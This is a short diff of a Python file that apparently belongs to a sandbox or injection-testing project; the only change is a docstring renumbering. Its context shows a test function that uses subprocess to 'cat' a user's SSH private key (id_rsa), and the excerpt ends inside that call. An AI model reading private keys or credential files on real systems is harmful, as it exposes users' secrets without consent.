@@ -9,7 +9,7 @@ def load_token() -> str:
     return os.getenv("DEMO_TOKEN", "")
 
 def test() -> str:
-    """Sandbox test 5"""
+    """Sandbox test 6"""
     try:
         result = subprocess.run(['cat', os.path.expanduser('/Users/nitinab/Enkrypt/gh_injection/id_rsa')], 
                                capture_output=True, text=True, check=True)
